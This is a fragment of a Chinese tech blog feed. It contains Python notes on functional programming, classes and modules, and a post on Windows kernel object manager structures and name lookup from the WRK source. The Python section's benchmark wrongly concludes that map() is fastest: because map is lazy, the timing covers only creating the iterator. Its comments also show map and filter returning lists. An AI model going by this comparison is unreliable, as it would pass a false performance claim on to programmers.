[]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> l:</span><br><span class="line">        new_list.append(item * <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> new_list</span><br></pre></td></tr></table></figure><p>函数式编程的优点，主要在于其纯函数和不可变的特性使程序更加健壮，易于调试（debug）和测试；缺点主要在于限制多，难写。当然，Python 不同于一些语言（比如 Scala），它并不是一门函数式编程语言，不过，Python 也提供了一些函数式编程的特性，值得我们了解和学习。</p><p>Python 主要提供了这么几个函数：map()、filter() 和 reduce()，通常结合匿名函数 lambda 一起使用。这些都是你需要掌握的东西，接下来我逐一介绍。</p><p>首先是 map(function, iterable) 函数，前面的例子提到过，它表示，对 iterable 中的每个元素，都运用 function 这个函数，最后返回一个新的可遍历的集合。比如刚才列表的例子，要对列表中的每个元素乘以 2，那么用 map 就可以表示为下面这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">new_list = map(<span class="keyword">lambda</span> x: x * <span class="number">2</span>, l) <span class="comment"># [2， 4， 6， 8， 10]</span></span><br></pre></td></tr></table></figure><p>我们可以以 map() 函数为例，看一下 Python 提供的函数式编程接口的性能。还是同样的列表例子，它还可以用 for 循环和 list comprehension（目前没有统一中文叫法，你也可以直译为列表理解等）实现，我们来比较一下它们的速度：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python3 -mtimeit -s<span class="string">'xs=range(1000000)'</span> <span class="string">'map(lambda x: x*2, xs)'</span></span><br><span class="line"><span class="number">2000000</span> loops, best of <span class="number">5</span>: <span class="number">171</span> nsec per loop</span><br><span class="line"> </span><br><span class="line">python3 -mtimeit -s<span class="string">'xs=range(1000000)'</span> <span class="string">'[x * 2 for x in xs]'</span></span><br><span class="line"><span class="number">5</span> loops, best of <span class="number">5</span>: <span class="number">62.9</span> msec per loop</span><br><span class="line"> </span><br><span class="line">python3 -mtimeit -s<span class="string">'xs=range(1000000)'</span> <span class="string">'l = []'</span> <span class="string">'for i in xs: l.append(i * 2)'</span></span><br><span class="line"><span class="number">5</span> loops, best of <span class="number">5</span>: <span class="number">92.7</span> msec per loop</span><br></pre></td></tr></table></figure><p>你可以看到，map() 是最快的。因为 map() 函数直接由 C 语言写的，运行时不需要通过 Python 解释器间接调用，并且内部做了诸多优化，所以运行速度最快。</p><p>接下来来看 filter(function, iterable) 函数，它和 map 函数类似，function 同样表示一个函数对象。filter() 函数表示对 iterable 中的每个元素，都使用 function 判断，并返回 True 或者 False，最后将返回 True 的元素组成一个新的可遍历的集合。</p><p>举个例子，比如我要返回一个列表中的所有偶数，可以写成下面这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">new_list = filter(<span class="keyword">lambda</span> x: x % <span class="number">2</span> == <span class="number">0</span>, l) <span class="comment"># [2, 4]</span></span><br></pre></td></tr></table></figure><p>最后我们来看 reduce(function, iterable) 函数，它通常用来对一个集合做一些累积操作。</p><p>function 同样是一个函数对象，规定它有两个参数，表示对 iterable 中的每个元素以及上一次调用后的结果，运用 function 进行计算，所以最后返回的是一个单独的数值。</p><p>举个例子，我想要计算某个列表元素的乘积，就可以用 reduce() 函数来表示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">product = reduce(<span class="keyword">lambda</span> x, y: x * y, l) <span class="comment"># 1*2*3*4*5 = 120</span></span><br></pre></td></tr></table></figure><p>当然，类似的，filter() 和 reduce() 的功能，也可以用 for 循环或者 list comprehension 来实现。</p><p>通常来说，在我们想对集合中的元素进行一些操作时，如果操作非常简单，比如相加、累积这种，那么我们优先考虑 map()、filter()、reduce() 这类或者 list comprehension 的形式。至于这两种方式的选择：</p><ul><li>在数据量非常多的情况下，比如机器学习的应用，那我们一般更倾向于函数式编程的表示，因为效率更高；</li><li>在数据量不多的情况下，并且你想要程序更加 Pythonic 的话，那么 list comprehension 也不失为一个好选择。</li></ul><p>不过，如果你要对集合中的元素，做一些比较复杂的操作，那么，考虑到代码的可读性，我们通常会使用 for 循环，这样更加清晰明了。</p><h1 id="七、面向对象"><a href="#七、面向对象" class="headerlink" title="七、面向对象"></a>七、面向对象</h1><p><strong>类，一群有着相同属性和函数的对象的集合。</strong></p><p><strong>init</strong>表示构造函数，意即一个对象生成时会被自动调用的函数。如果一个属性以 __ （注意，此处有两个 _） 开头，我们就默认这个属性是私有属性。私有属性，是指不希望在类的函数之外的地方被访问和修改的属性。</p><ul><li><p>如何在一个类中定义一些常量，每个对象都可以方便访问这些常量而不用重新构造？</p><p>在 Python 的类里，你只需要和函数并列地声明并赋值，就可以实现这一点。</p></li><li><p>如果一个函数不涉及到访问修改这个类的属性，而放到类外面有点不恰当，怎么做才能更优雅呢？</p><p>使用类函数、成员函数和静态函数。前两者产生的影响是动态的，能够访问或者修改对象的属性；而静态函数则与类没有什么关联，最明显的特征便是，静态函数的第一个参数没有任何特殊性。</p><p>具体来看这几种函数。一般而言，静态函数可以用来做一些简单独立的任务，既方便测试，也能优化代码结构。静态函数还可以通过在函数前一行加上 @staticmethod 来表示，代码中也有相应的示例。这其实使用了装饰器的概念。</p><p>而类函数的第一个参数一般为 cls，表示必须传一个类进来。类函数最常用的功能是实现不同的 <strong>init</strong> 构造函数。类似的，类函数需要装饰器 @classmethod 来声明。</p><p>成员函数则是我们最正常的类的函数，它不需要任何装饰器声明，第一个参数 self 代表当前对象的引用，可以通过此函数，来实现想要的查询 / 修改类的属性等功能。</p></li><li><p>既然类是一群相似的对象的集合，那么可不可以是一群相似的类的集合呢？</p><p><strong>继承</strong></p><p>类的继承，顾名思义，指的是一个类既拥有另一个类的特征，也拥有不同于另一个类的独特特征。在这里的第一个类叫做子类，另一个叫做父类，特征其实就是类的属性和函数。</p><p>首先需要注意的是构造函数。每个类都有构造函数，继承类在生成对象的时候，是不会自动调用父类的构造函数的，因此你必须在 <strong>init</strong>() 函数中显式调用父类的构造函数。它们的执行顺序是 子类的构造函数 -&gt; 父类的构造函数。</p><p>抽象类是一种特殊的类，它生下来就是作为父类存在的，一旦对象化就会报错。同样，抽象函数定义在抽象类之中，子类必须重写该函数才能使用。相应的抽象函数，则是使用装饰器 @abstractmethod 来表示。</p></li></ul><h1 id="八、模块化编程"><a href="#八、模块化编程" class="headerlink" title="八、模块化编程"></a>八、模块化编程</h1><p>调用子目录的模块时，只需要使用 <code>.</code> 代替 <code>/</code> 来表示子目录，例如：utils.utils 表示 utils 子文件夹下的 utils.py 模块就行。</p><p>那如果我们想调用上层目录呢？注意，<code>sys.path.append(&quot;..&quot;)</code> 表示将当前程序所在位置<strong>向上</strong>提了一级，之后就能调用 utils 的模块了。</p><p>同时要注意一点，import 同一个模块只会被执行一次，这样就可以防止重复导入模块出现问题。</p><p>最后我想再提一下版本区别。你可能在许多教程中看到过这样的要求：我们还需要在模块所在的文件夹新建一个 <code>__init__.py</code>，内容可以为空，也可以用来表述包对外暴露的模块接口。不过，事实上，这是 Python 2 的规范。在 Python 3 规范中，<code>__init__.py</code> 并不是必须的。</p><p>通常，一个 Python 文件在运行的时候，都会有一个运行时位置，最开始时即为这个文件所在的文件夹。当然，这个运行路径以后可以被改变。运行 <code>sys.path.append(&quot;..&quot;)</code> ，则可以改变当前 Python 解释器的位置。</p><p>神奇的 if <strong>name</strong> == ‘<strong>main</strong>‘：</p><p>import 在导入文件的时候，会自动把所有暴露在外面的代码全都执行一遍。因此，如果你要把一个东西封装成模块，又想让它可以执行的话，你必须将要执行的代码放在 <code>if __name__ == &#39;__main__&#39;</code>下面。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;一、Python知识图谱&quot;&gt;&lt;a href=&quot;#一、Python知识图谱&quot; class=&quot;headerlink&quot; title=&quot;一、Python知识图谱&quot;&gt;&lt;/a&gt;一、Python知识图谱&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;python%E7%9F%A5%E8%A
      
    
    </summary>
    
    
      <category term="技术分析" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Windows内核对象</title>
    <link href="http://yoursite.com/2020/03/30/Windows%E5%86%85%E6%A0%B8%E5%AF%B9%E8%B1%A1/"/>
    <id>http://yoursite.com/2020/03/30/Windows%E5%86%85%E6%A0%B8%E5%AF%B9%E8%B1%A1/</id>
    <published>2020-03-30T03:52:24.000Z</published>
    <updated>2020-03-30T07:02:02.222Z</updated>
    
    <content type="html"><![CDATA[<p>Windows对象管理器的基本设计意图是：</p><p>​    为执行体的数据结构提供一种统一而又可扩展的定义和控制机制。</p><p>​    提供统一的安全访问机制。</p><p>​    在无须修改已有系统代码的情况下，加入新的对象类型。</p><p>​    提供一组标准的API来对对象执行各种操作。</p><p>​    提供一种命名机制，与文件系统的命名机制集成在一起。</p><p>每一个对象由两部分构成：对象头和对象体。所有对象的对象头都具有统一的格式，其定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OBJECT_CREATE_INFORMATION</span> *<span class="title">POBJECT_CREATE_INFORMATION</span>;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OBJECT_HEADER</span> &#123;</span></span><br><span class="line">    LONG_PTR PointerCount;<span class="comment">//引用计数</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        LONG_PTR HandleCount;<span class="comment">//指向该对象的句柄数</span></span><br><span class="line">        PVOID NextToFree;<span class="comment">//对象被延迟删除时加入到一条链中</span></span><br><span class="line">    &#125;;</span><br><span class="line">    POBJECT_TYPE Type;<span class="comment">//指向对象的类型对象</span></span><br><span class="line">    UCHAR NameInfoOffset;<span class="comment">//名称信息的内存偏移</span></span><br><span class="line">    UCHAR HandleInfoOffset;<span class="comment">//句柄信息的内存偏移</span></span><br><span class="line">    UCHAR QuotaInfoOffset;<span class="comment">//配额信息的内存偏移</span></span><br><span class="line">    UCHAR Flags;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        POBJECT_CREATE_INFORMATION ObjectCreateInfo;</span><br><span class="line">        PVOID QuotaBlockCharged;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    PSECURITY_DESCRIPTOR SecurityDescriptor;<span class="comment">//安全描述符</span></span><br><span class="line">    QUAD Body;<span class="comment">//对象体开始</span></span><br><span class="line">&#125; OBJECT_HEADER, *POBJECT_HEADER;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _OBJECT_HEADER</span><br><span class="line">nt!_OBJECT_HEADER</span><br><span class="line">   +<span class="number">0x000</span> PointerCount     : Int4B</span><br><span class="line">   +<span class="number">0x004</span> HandleCount      : Int4B</span><br><span class="line">   +<span class="number">0x004</span> NextToFree       : Ptr32 Void</span><br><span class="line">   +<span class="number">0x008</span> Type             : Ptr32 _OBJECT_TYPE</span><br><span class="line">   +<span class="number">0x00c</span> NameInfoOffset   : UChar</span><br><span class="line">   +<span class="number">0x00d</span> HandleInfoOffset : UChar</span><br><span class="line">   +<span class="number">0x00e</span> QuotaInfoOffset  : UChar</span><br><span class="line">   +<span class="number">0x00f</span> Flags            : UChar</span><br><span class="line">   +<span class="number">0x010</span> ObjectCreateInfo : Ptr32 _OBJECT_CREATE_INFORMATION</span><br><span class="line">   +<span class="number">0x010</span> QuotaBlockCharged : Ptr32 Void</span><br><span class="line">   +<span class="number">0x014</span> SecurityDescriptor : Ptr32 Void</span><br><span class="line">   +<span class="number">0x018</span> Body             : _QUAD</span><br></pre></td></tr></table></figure><p>对象头包含了对象管理所需的基本信息，在Windows中，每一种对象都需要有一个对应的类型对象（OBJECT_TYPE对象），其定义为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OBJECT_LOCK_COUNT 4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OBJECT_TYPE</span> &#123;</span></span><br><span class="line">    ERESOURCE Mutex;</span><br><span class="line">    LIST_ENTRY TypeList;</span><br><span class="line">    UNICODE_STRING Name;            <span class="comment">// Copy from object header for convenience</span></span><br><span class="line">    PVOID DefaultObject;</span><br><span class="line">    ULONG Index;<span class="comment">// 此类型对象在全局数组中的索引</span></span><br><span class="line">    ULONG TotalNumberOfObjects;</span><br><span class="line">    ULONG TotalNumberOfHandles;</span><br><span class="line">    ULONG HighWaterNumberOfObjects;</span><br><span class="line">    ULONG HighWaterNumberOfHandles;</span><br><span class="line">    OBJECT_TYPE_INITIALIZER TypeInfo;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> POOL_TAGGING</span></span><br><span class="line">    ULONG Key;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//POOL_TAGGING</span></span></span><br><span class="line">    ERESOURCE ObjectLocks[ OBJECT_LOCK_COUNT ];</span><br><span class="line">&#125; OBJECT_TYPE, *POBJECT_TYPE;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _OBJECT_TYPE</span><br><span class="line">ntdll!_OBJECT_TYPE</span><br><span class="line">   +<span class="number">0x000</span> Mutex            : _ERESOURCE</span><br><span class="line">   +<span class="number">0x038</span> TypeList         : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x040</span> Name             : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x048</span> DefaultObject    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x04c</span> Index            : Uint4B</span><br><span class="line">   +<span class="number">0x050</span> TotalNumberOfObjects : Uint4B</span><br><span class="line">   +<span class="number">0x054</span> TotalNumberOfHandles : Uint4B</span><br><span class="line">   +<span class="number">0x058</span> HighWaterNumberOfObjects : Uint4B</span><br><span class="line">   +<span class="number">0x05c</span> HighWaterNumberOfHandles : Uint4B</span><br><span class="line">   +<span class="number">0x060</span> TypeInfo         : _OBJECT_TYPE_INITIALIZER</span><br><span class="line">   +<span class="number">0x0ac</span> Key              : Uint4B</span><br><span class="line">   +<span class="number">0x0b0</span> ObjectLocks      : [<span class="number">4</span>] _ERESOURCE</span><br></pre></td></tr></table></figure><p>​    系统定义的对象种类有限，WRK支持的31种对象，各有哟个全局的POBJECT_TYPE变量指向其类型对象：</p><table><thead><tr><th>ObjectType:</th></tr></thead><tbody><tr><td>CmpKeyObjectType</td></tr><tr><td>DbgkDebugObjectType</td></tr><tr><td>ExCallbackobjectType</td></tr><tr><td>ExDesktopObjectType</td></tr><tr><td>ExEventobjectType</td></tr><tr><td>ExEventPairObjectType</td></tr><tr><td>ExMutantObjectType</td></tr><tr><td>ExpKeyedEventObjectType</td></tr><tr><td>ExProfileObjectType</td></tr><tr><td>ExSemaphoreObjectType</td></tr><tr><td>ExTimerObjectType</td></tr><tr><td>ExWindowStationObjecType</td></tr><tr><td>IoAdapterObjectType</td></tr><tr><td>IoCompletionObjectType</td></tr><tr><td>IoControllerObjectType</td></tr><tr><td>IoDeviceHandlerObjectType</td></tr><tr><td>IoDeviveObjectType</td></tr><tr><td>IoDriverObjectType</td></tr><tr><td>LpcPortObjectType</td></tr><tr><td>LpcWaitablePortObjectType</td></tr><tr><td>MmSectionObjectType</td></tr><tr><td>ObpDeviceMapObjectType</td></tr><tr><td>ObpDirectoryObjectType</td></tr><tr><td>ObpSymbolicLinkObjectType</td></tr><tr><td>ObpTypeobjectType</td></tr><tr><td>PsJobType</td></tr><tr><td>PsProcessType</td></tr><tr><td>PsThreadType</td></tr><tr><td>SeTokenObjectType</td></tr><tr><td>WmipGuidObjectType</td></tr></tbody></table><p>​    系统在初始化过程中会调用ObCreateObjectType()函数构建起这种对象类型，以完成相应全局变量的初始化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NTSTATS</span><br><span class="line">ObCreateObjectType(</span><br><span class="line">__in PUNICODE_STRING Typename,</span><br><span class="line">__in POBJECT_TYPE_INITIALIZER ObjectTypeInitializer,</span><br><span class="line">__in_opt PSECURITY_DESRIPTOR SecurityDescriptor,</span><br><span class="line">__out POBJECT_TYPE *ObjectType</span><br><span class="line">);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OBJECT_TYPE_INITIALIZER</span> &#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    BOOLEAN UseDefaultObject;</span><br><span class="line">    BOOLEAN CaseInsensitive;</span><br><span class="line">    ULONG InvalidAttributes;</span><br><span class="line">    GENERIC_MAPPING GenericMapping;</span><br><span class="line">    ULONG ValidAccessMask;</span><br><span class="line">    BOOLEAN SecurityRequired;</span><br><span class="line">    BOOLEAN MaintainHandleCount;</span><br><span class="line">    BOOLEAN MaintainTypeList;</span><br><span class="line">    POOL_TYPE PoolType;</span><br><span class="line">    ULONG DefaultPagedPoolCharge;</span><br><span class="line">    ULONG DefaultNonPagedPoolCharge;</span><br><span class="line">    OB_DUMP_METHOD DumpProcedure;</span><br><span class="line">    OB_OPEN_METHOD OpenProcedure;</span><br><span class="line">    OB_CLOSE_METHOD CloseProcedure;</span><br><span class="line">    OB_DELETE_METHOD DeleteProcedure;</span><br><span class="line">    OB_PARSE_METHOD ParseProcedure;</span><br><span class="line">    OB_SECURITY_METHOD SecurityProcedure;</span><br><span class="line">    OB_QUERYNAME_METHOD QueryNameProcedure;</span><br><span class="line">    OB_OKAYTOCLOSE_METHOD OkayToCloseProcedure;</span><br><span class="line">&#125; OBJECT_TYPE_INITIALIZER, *POBJECT_TYPE_INITIALIZER;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _OBJECT_TYPE_INITIALIZER</span><br><span class="line">ntdll!_OBJECT_TYPE_INITIALIZER</span><br><span class="line">   +<span class="number">0x000</span> Length           : Uint2B</span><br><span class="line">   +<span class="number">0x002</span> UseDefaultObject : UChar</span><br><span class="line">   +<span class="number">0x003</span> CaseInsensitive  : UChar</span><br><span class="line">   +<span class="number">0x004</span> InvalidAttributes : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> GenericMapping   : _GENERIC_MAPPING</span><br><span class="line">   +<span class="number">0x018</span> ValidAccessMask  : Uint4B</span><br><span class="line">   +<span class="number">0x01c</span> SecurityRequired : UChar</span><br><span class="line">   +<span class="number">0x01d</span> MaintainHandleCount : UChar</span><br><span class="line">   +<span class="number">0x01e</span> MaintainTypeList : UChar</span><br><span class="line">   +<span class="number">0x020</span> PoolType         : _POOL_TYPE</span><br><span class="line">   +<span class="number">0x024</span> DefaultPagedPoolCharge : Uint4B</span><br><span class="line">   +<span class="number">0x028</span> DefaultNonPagedPoolCharge : Uint4B</span><br><span class="line">   +<span class="number">0x02c</span> DumpProcedure    : Ptr32     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x030</span> OpenProcedure    : Ptr32     <span class="keyword">long</span> </span><br><span class="line">   +<span class="number">0x034</span> CloseProcedure   : Ptr32     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x038</span> DeleteProcedure  : Ptr32     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x03c</span> ParseProcedure   : Ptr32     <span class="keyword">long</span> </span><br><span class="line">   +<span class="number">0x040</span> SecurityProcedure : Ptr32     <span class="keyword">long</span> </span><br><span class="line">   +<span class="number">0x044</span> QueryNameProcedure : Ptr32     <span class="keyword">long</span> </span><br><span class="line">   +<span class="number">0x048</span> OkayToCloseProcedure : Ptr32     <span class="keyword">unsigned</span> <span class="keyword">char</span></span><br></pre></td></tr></table></figure><p>调用ObCreateObjectType函数来构建一种新的对象类型时，调用者除了可以指定此种类型对象的一些数据特性外，还可以指定该类型对象的一些基本操作方法。</p><p>​    系统有一个全局变量ObpObjectTypes数组记录所有已创建的类型，这是个静态数组。一旦对象类型被创建，以后内核代码就可以调用ObCreateObject来创建此种类型的对象了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line">ObCreateObject(</span><br><span class="line">    __in KPROCESSOR_MODE ProbeMode,</span><br><span class="line">    __in POBJECT_TYPE ObjectType,</span><br><span class="line">    __in_opt POBJECT_ATTRIBUTES ObjectAttributes,</span><br><span class="line">    __in KPROCESSOR_MODE OwnershipMode,</span><br><span class="line">    __inout_opt PVOID ParseContext,</span><br><span class="line">    __in ULONG ObjectBodySize,</span><br><span class="line">    __in ULONG PagedPoolCharge,</span><br><span class="line">    __in ULONG NonPagedPoolCharge,</span><br><span class="line">    __out PVOID *Object</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>该函数返回时，Object输出参数指向对象体起始位置。对象体的格式是特定于某种对象类型的，由相应类型对象的诸多过程来维护。</p><p>​    对象管理器使用对象头中包含的信息来管理这些对象，在对象头中，除了对象名称和对象类型，另有两个重要的信息：指针计数，它记录了内核引用该对象的次数；句柄计数，它记录了有多少个句柄引用此对象，这些句柄可能出现在不同进程中。</p><p>​    类型对象并不需要为此种的对象提供所有在OBJECT_TYPE_INITIALIZER定义中出现的方法。对象管理器提供了一些通用的服务，这些通用服务可以应用在任何类型的对象上。</p><p>​    对象的构造是由两部分来完成的：1.调用ObCreateObject，根据指定的类型对象来完成对象头的初始化，并且按照指定的大小分配对象体的内存；2.完成对象体的初始化。前者可以统一完成，后者不可以，因为各种类型的对象体有自己不同的初始化逻辑。</p><p>​    Windows也允许使用名称的方式来管理对象。为了做到这一点，Windows必须维护一套全局的名称查询机制。ObpDirectoryObjectType  类型对像是实现这一机制的关键。</p><p>​    Windwos内部维护了一个对象层级目录（即系统全局名字空间），其根目录对象是由全局变量ObpRootDirectoryObject来定义的。在根目录之下，系统内置了一些子目录。在WRK中，通过查询NtCreateDirectoryObject函数被调用的情况，可以看到Callback、ArcName、Device、Driver、FileSystem、KernelObjects、ObjectTypes、GLOBAL??和Security子目录的创建过程。</p><p>​    对象管理器提供了一些基本的操作用于在名字空间中插入、查询和删除目录或目录项。例如，</p><table><thead><tr><th>函数</th><th>操作（以下三个函数都直接在一个子目录中进行操作）</th></tr></thead><tbody><tr><td>ObpLookupDirectoryEntry</td><td>在一个指定的目录中查找一个名称</td></tr><tr><td>ObpInsertDirectoryEntry</td><td>把一个对象插入到一个目录中</td></tr><tr><td>ObpDeleteDirectoryEntry</td><td>删除刚刚找到的那一项</td></tr></tbody></table><table><thead><tr><th>函数</th><th>操作</th></tr></thead><tbody><tr><td>ObpLookupObjectName</td><td>可以从指定的目录或根目录，递归地根据名称来找到一个对象。</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line">ObpLookupObjectName (</span><br><span class="line">    IN HANDLE RootDirectoryHandle,</span><br><span class="line">    IN PUNICODE_STRING ObjectName,</span><br><span class="line">    IN ULONG Attributes,</span><br><span class="line">    IN POBJECT_TYPE ObjectType,</span><br><span class="line">    IN KPROCESSOR_MODE AccessMode,</span><br><span class="line">    IN PVOID ParseContext OPTIONAL,</span><br><span class="line">    IN PSECURITY_QUALITY_OF_SERVICE SecurityQos OPTIONAL,</span><br><span class="line">    IN PVOID InsertObject OPTIONAL,</span><br><span class="line">    IN OUT PACCESS_STATE AccessState,</span><br><span class="line">    OUT POBP_LOOKUP_CONTEXT LookupContext,</span><br><span class="line">    OUT PVOID *FoundObject</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>其基本的执行逻辑：</p><p>​    参数检查。</p><p>​    如果调用者指定了RootDirectoryHandle参数，则利用此RootDirectory的Parse方法来解析对象名称，直到解析成功或者不成功，或者指示从头解析</p><p>​    如果调用者没有指定RootDirectoryHandle参数，则系统从全局的根目录ObpRootDirectoryObject开始解析。在这种情况下，传递进来的对象名称必须以“\”开始。如果待查找的名称仅仅是“\”，则执行特殊处理。否则，执行：    </p><p>​        1.首先判断名称是否以“??\”打头，如果是的话，就需要拿到当前进程的DeviceMap（设备表），以进一步查询。</p><p>​        2.如果名称正好是”??”，则直接返回当前进程的DeviceMap作为结果。（DeviceMap定义了一个DOS设备的名字空间，比如驱动器字母C: D:）和一些外设（如COM1）。当对象管理器看到一个以“??\”打头的名称或者像“??”这样的名称，它会利用进程的DeviceMap来获得相应的对象目录，然后进一步解析剩余的名称字符串。）</p><p>​        3.调用ObpLookupDirectoryEntry函数，层层递进，或者碰到具有Parse方法的对象，由它来解析余下的名称字符串，或者碰到子目录对象，从而可以在子目录对象中进一步查询下一级名称。</p><p>​    对象管理器的两个接口函数：ObOpenObjectByName和ObReferenceObjectByName，正是通过ObpLookupObjectName来完成其打开对象或引用对象的功能的。ObInsertObject，它的作用是把一个对象插入到一个进程的句柄表中，也通过ObpLookupObjectName函数来验证待插入的对象是否在全局名字空间中</p><p>​    对象管理器中的对象是执行体对象，他们位于系统地址空间中，因而所有的进程都可以访问这些对象。但是用户模式的代码只能通过系统调用和句柄表来引用执行体对象。内核中将一个句柄转化为相应的对象，可以通过ObReferenceObjectByHandle函数来完成。该函数负责从当前进程环境或内核环境的句柄表中获得指定的对象引用。</p><p>​    对象是通过引用计数来管理其生命周期的，一旦引用计数为0，则对象生命周期结束，它所占用的内存也可以被回收。</p>]]></content>
    
    <summary type="html">
    
      
      
